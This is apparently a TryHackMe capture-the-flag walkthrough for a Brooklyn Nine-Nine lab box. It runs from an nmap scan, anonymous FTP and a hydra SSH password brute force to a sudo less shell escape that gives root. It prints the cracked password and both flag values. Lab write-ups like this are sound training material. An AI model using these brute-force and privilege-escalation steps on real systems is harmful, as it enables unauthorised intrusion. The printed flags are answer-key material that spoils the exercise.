@@ -1,0 +1,146 @@
+==============================================================================================================================
+// INFORMATION
+IP = 10.10.146.127
+Date = 9/10/2022
+
+==============================================================================================================================
+// scan the box using nmap with give command
+ $nmap -sV -Pn 10.10.146.127
+
+
+==============================================================================================================================
+// now you can see there is ftp server so we can login into the ftp server using below command 
+$ftp 10.10.146.127
+
+
+==============================================================================================================================
+// now you can login into the ftp server using anonymous user name so 
+usrername: anonymous
+password: anonymous
+
+
+==============================================================================================================================
+// use ls -l command to see the content of the folder
+$ls -l
+
+
+==============================================================================================================================
+// now you just saw file not_to_jake.txt and now copy the file back to the file
+
+$get note_to_jack.txt
+$exit
+
+==============================================================================================================================
+// file is your system now cat the file and see the content of the file 
+
+
+cat note_to_jack.txt
+
+
+output : Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+
+==============================================================================================================================
+
+// so there is a user name jack and we saw a ssh in the nmap output so we will use ssh to login into the machine 
+
+$ssh jake@$IP
+==============================================================================================================================
+
+// let's brute force the password using hydra tool
+
+$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.146.127/
+
+
+==============================================================================================================================
+// this will return you the correct password of the accouunt 
+
+
+$ssh jake@$IP
+
+// password for the account is 987654321
+==============================================================================================================================
+// move to the home dir using cd command : maybe face issue in it but no need to go in the file of jake
+
+$cd /home/
+
+==============================================================================================================================
+//find the file of user.txt using the give command
+
+$find . -name user.txt
+
+output 
+===========================================
+find: ‘./holt/.gnupg’: Permission denied
+find: ‘./holt/.ssh’: Permission denied
+./holt/user.txt
+find: ‘./holt/.local/share’: Permission denied
+find: ‘./holt/.cache’: Permission denied
+find: ‘./amy/.gnupg’: Permission denied
+find: ‘./amy/.ssh’: Permission denied
+find: ‘./amy/.cache’: Permission denied
+==========================================
+// this is what I am looking for ./holt/user.txt
+
+==============================================================================================================================
+// move to dir of the file using the cd command and use cat command to print content the file 
+// and submit the flag on the TRYHACKME
+
+
+$ cd holt/
+$ ls -l
+$ cat user.txt
+
+output 
+================================
+ee11cbb19052e40b07aac0ca060c23ee
+================================
+
+==============================================================================================================================
+// find all the program using sudo permission on the file
+
+$ sudo -l
+
+ouput 
+===========================================
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+==========================================
+// this is what I was looking for 
+    (ALL) NOPASSWD: /usr/bin/less
+
+==============================================================================================================================
+
+// check the following link and search the program
+
+https://gtfobins.github.io/
+
+sudo less /etc/profile
+!/bin/sh
+
+// run the above command in terminal
+
+==============================================================================================================================
+// now let see who am I using the command 
+$ whomai
+
+output
+==========================================
+root
+==========================================
+
+
+// move and play as a root a bit  
+// flag value
+63a9f0ea7bb98050796b649e85481845
+
+==============================================================================================================================
+
+
+
+
+														GOOD LUCK ALL DONE
+
